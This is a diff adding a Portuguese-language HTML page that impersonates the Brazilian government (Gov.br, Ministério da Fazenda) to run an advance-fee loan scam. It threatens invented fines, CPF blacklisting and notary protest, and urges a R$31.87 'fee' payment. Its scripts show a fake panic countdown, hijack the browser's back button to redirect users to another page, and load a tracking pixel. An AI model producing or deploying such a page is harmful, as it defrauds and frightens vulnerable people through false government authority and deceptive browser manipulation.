@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gov.br - Alerta de Cancelamento</title>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- DESIGN SYSTEM GOVERNO FEDERAL --- */
+        :root {
+            --gov-blue: #1351b4;
+            --gov-dark: #0c326f;
+            --alert-red: #b91111;
+            --bg-overlay: rgba(0, 0, 0, 0.7);
+            --font-stack: 'Rawline', system-ui, -apple-system, sans-serif;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0; padding: 0;
+            font-family: var(--font-stack);
+            background-color: #333; /* Fundo escuro para destacar o modal */
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* CARD CENTRAL FLUTUANTE */
+        .modal-container {
+            background: #fff;
+            width: 95%; max-width: 480px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
+            border: 1px solid #ccc;
+        }
+
+        /* CABEÇALHO GOV */
+        .gov-header {
+            background: linear-gradient(to right, var(--gov-blue), var(--gov-dark));
+            padding: 15px 20px;
+            display: flex; align-items: center; gap: 12px;
+            color: white;
+        }
+        .gov-logo { height: 32px; filter: brightness(0) invert(1); }
+        .gov-title { 
+            font-size: 14px; font-weight: 600; line-height: 1.2; 
+            border-left: 1px solid rgba(255,255,255,0.3); padding-left: 12px; 
+        }
+
+        /* CONTEÚDO DO ALERTA */
+        .content-body { padding: 25px 20px; text-align: center; }
+
+        .alert-icon-box {
+            width: 70px; height: 70px; background: #fff5f5; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 15px auto; border: 2px solid var(--alert-red);
+            animation: pulse-red 2s infinite;
+        }
+        .alert-icon { font-size: 32px; color: var(--alert-red); }
+
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(185, 17, 17, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(185, 17, 17, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(185, 17, 17, 0); }
+        }
+
+        h1 {
+            font-size: 22px; font-weight: 800; color: var(--alert-red);
+            margin: 0 0 10px 0; text-transform: uppercase; letter-spacing: -0.5px;
+        }
+
+        p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+
+        /* CAIXA DE MULTA */
+        .fine-card {
+            background: #fdf2f2; border: 1px dashed var(--alert-red);
+            padding: 15px; border-radius: 6px; margin-bottom: 20px;
+            text-align: left;
+        }
+        .fine-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+        .fine-label { color: #666; font-weight: 500; }
+        .fine-val { font-weight: 700; color: #333; }
+        .fine-total { 
+            border-top: 1px solid rgba(185, 17, 17, 0.2); margin-top: 8px; padding-top: 8px;
+            font-size: 16px; color: var(--alert-red); display: flex; justify-content: space-between;
+        }
+
+        /* BOTÃO DE AÇÃO */
+        .btn-action {
+            display: flex; align-items: center; justify-content: center; flex-direction: column;
+            width: 100%; padding: 16px;
+            background: #28a745; color: white;
+            border: none; border-radius: 6px;
+            font-size: 16px; font-weight: 700; text-transform: uppercase;
+            text-decoration: none; cursor: pointer;
+            box-shadow: 0 4px 6px rgba(40, 167, 69, 0.25);
+            transition: transform 0.1s;
+        }
+        .btn-action:active { transform: scale(0.98); }
+        .btn-sub { font-size: 11px; font-weight: 400; text-transform: none; margin-top: 3px; opacity: 0.9; }
+
+        /* FOOTER */
+        .footer {
+            background: #f8f9fa; padding: 12px; font-size: 10px; color: #888;
+            text-align: center; border-top: 1px solid #eee;
+        }
+
+        .timer {
+            font-size: 12px; color: var(--alert-red); font-weight: 700; margin-top: 15px;
+            background: #fff; padding: 5px 10px; border-radius: 20px; border: 1px solid #eee;
+            display: inline-block;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="modal-container">
+        <div class="gov-header">
+            <img src="images/1200px-Coat_of_arms_of_Brazil.svg.png" class="gov-logo" alt="Gov.br">
+            <div class="gov-title">
+                Ministério da Fazenda<br>
+                <span style="font-weight:400; font-size:12px;">Departamento de Cobrança</span>
+            </div>
+        </div>
+
+        <div class="content-body">
+            <div class="alert-icon-box">
+                <i class="fas fa-hand-paper alert-icon"></i>
+            </div>
+
+            <h1>Ação Não Permitida</h1>
+            
+            <p><strong>ATENÇÃO CIDADÃO:</strong> O sistema detectou uma tentativa de abandono de contrato. O seu empréstimo de <strong>R$ 4.600,00</strong> já está reservado e o não pagamento da taxa de cartório configura <strong>Quebra de Contrato</strong>.</p>
+
+            <div class="fine-card">
+                <div class="fine-row">
+                    <span class="fine-label">Multa Rescisória (Bacen):</span>
+                    <span class="fine-val">R$ 197,00</span>
+                </div>
+                <div class="fine-row">
+                    <span class="fine-label">Taxa Adm. Cancelamento:</span>
+                    <span class="fine-val">R$ 100,90</span>
+                </div>
+                <div class="fine-row">
+                    <span class="fine-label">IOF já pago:</span>
+                    <span class="fine-val" style="color:red">Perdido</span>
+                </div>
+                <div class="fine-total">
+                    <span style="font-weight:800">TOTAL A SER COBRADO:</span>
+                    <span style="font-weight:800">R$ 297,90</span>
+                </div>
+                <div style="font-size:10px; color:#b91111; margin-top:5px;">
+                    *Cobrança enviada para Protesto em Cartório (SPC/Serasa) em 48h.
+                </div>
+            </div>
+
+            <p style="font-size: 13px; margin-bottom: 20px;">
+                Evite o bloqueio do seu CPF. A taxa de cartório é de apenas <strong>R$ 31,87</strong> e será devolvida.
+            </p>
+
+            <a href="/11.php?valor=31.87" class="btn-action">
+                QUERO EVITAR A MULTA
+                <span class="btn-sub">(Pagar taxa de R$ 31,87 e liberar R$ 4.600)</span>
+            </a>
+            
+
+            <div class="timer">
+                Processo de negativação inicia em: <span id="countdown">02:59</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            Protocolo de Segurança: #BR-9921-XJ • IP Monitorado<br>
+            Governo Federal - Brasil
+        </div>
+    </div>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        // 1. Pega todos os parâmetros da URL atual (onde o cliente está)
+        const currentParams = new URLSearchParams(window.location.search);
+
+        // 2. Seleciona todos os botões que tenham a classe 'btn-action'
+        const buttons = document.querySelectorAll('.btn-action');
+
+        buttons.forEach(btn => {
+            // Verifica se o botão tem um link válido
+            if (btn.href) {
+                try {
+                    // Cria um objeto URL para manipular o link do botão de forma segura
+                    const targetUrl = new URL(btn.href);
+
+                    // Joga todos os parâmetros da página atual para dentro do link do botão
+                    currentParams.forEach((value, key) => {
+                        targetUrl.searchParams.set(key, value);
+                    });
+
+                    // Atualiza o link final do botão
+                    btn.href = targetUrl.toString();
+                    
+                    // (Opcional) Log para você ver no console que funcionou
+                    // console.log("Link atualizado:", btn.href);
+                } catch (e) {
+                    console.error("Erro ao processar URL do botão:", e);
+                }
+            }
+        });
+    });
+</script>
+    <script>
+        // Timer de Pânico
+        let time = 179; 
+        setInterval(() => {
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            m = m < 10 ? '0' + m : m;
+            s = s < 10 ? '0' + s : s;
+            document.getElementById('countdown').innerText = m + ':' + s;
+            if(time > 0) time--;
+        }, 1000);
+
+        // Previne o botão de voltar do navegador (Comportamento básico)
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "69a0b73ca9aee7f86c217821";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '/redirect/up2/back2/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+<script>
+const params = window.location.search;
+document.querySelectorAll('.btn-action').forEach(btn => {
+  btn.href += params;
+});
+</script>
+
+
+</body></html>
